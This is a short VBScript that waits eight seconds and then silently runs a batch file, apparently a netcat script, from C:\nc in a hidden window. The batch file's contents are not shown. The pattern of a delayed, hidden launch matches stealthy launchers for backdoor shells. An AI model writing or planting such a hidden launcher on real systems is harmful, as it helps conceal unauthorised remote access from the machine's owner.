WScript.Sleep(8000)

Set oShell = CreateObject ("Wscript.Shell") 
Dim strArgs
strArgs = "cmd /c C:\nc\nc.bat"
oShell.Run strArgs, 0, false
